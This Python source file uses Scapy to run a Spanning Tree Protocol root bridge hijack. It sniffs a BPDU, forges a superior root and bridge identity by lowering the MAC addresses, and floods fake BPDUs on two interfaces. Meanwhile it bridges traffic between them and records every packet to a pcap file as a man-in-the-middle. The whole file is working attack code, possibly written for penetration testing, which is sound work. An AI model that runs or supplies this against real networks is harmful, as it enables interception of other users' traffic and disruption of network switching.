from scapy.layers.l2 import *
from scapy.packet import *
from scapy.sendrecv import sniff, bridge_and_sniff
from scapy.utils import PcapWriter
from threading import Thread, current_thread


def stp_root_bridge_mitm(i1, i2, dumpfile):

    def bridge_func(packet):
        pcap.write_packet(packet=packet)
        return True

    # Sniff a BPDU from any interface
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=i1)

    # Scrape parameters from stp packet
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    root_mac = STP_pkt.rootmac
    bridge_mac = STP_pkt.bridgemac

    # Modify root and bridge mac
    root_mac_int = int(root_mac.replace(':',''), 16)
    root_mac_int -=1
    root_mac_hex = "{:012x}".format(root_mac_int)
    root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

    bridge_mac_int = int(bridge_mac.replace(':',''), 16)
    bridge_mac_int -=1
    bridge_mac_hex = "{:012x}".format(bridge_mac_int)
    bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))

    params = {"rootmac": root_mac, "bridgemac":bridge_mac, "rootid":root_id, "bridgeid":bridge_id}

    #Start the attack

    try:
        global pcap 
        pcap = PcapWriter(dumpfile)

        t1 = Thread(target=stp_root_bridge_hijack, args=(i1, params,))
        t2 = Thread(target=stp_root_bridge_hijack, args=(i2, params,))
        
        

        t1.start()
        t2.start()
        
        bridge_and_sniff(i1,i2,bridge_func, bridge_func)

        while True:
            if t1.is_alive():
                t1.join(0.5)
            if t2.is_alive():
                t2.join(0.5)
        
    except KeyboardInterrupt:
        t1.alive = False
        t2.alive = False

        t1.join()
        t2.join()

        pcap.close()

    return

def stp_root_bridge_hijack(interface, params):

    """
    Launches an STP ROOT HIJACK attack utilizing a previously sniffed BPDU
    :param params: packet parameters
    :type params: dict
    """
    t = current_thread()
    t.alive = True

    root_id = params['rootid']
    bridge_id = params['bridgeid']
    bridgeMAC = params['bridgemac']
    rootMAC = params['rootmac']

    # Final BDPU
    pkt = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac = rootMAC, \
        bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)

    
    while t.alive:
        p_sniff = srp1(pkt, iface=interface, verbose = 0, timeout = 2)
        if p_sniff is not None and STP in p_sniff and p_sniff[Dot3].src != rootMAC:
            pkt_ack = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x81, portid=0x8002, rootmac = rootMAC, \
            bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)
            sendp(pkt_ack, iface=interface, verbose=0)
        
    return 0
    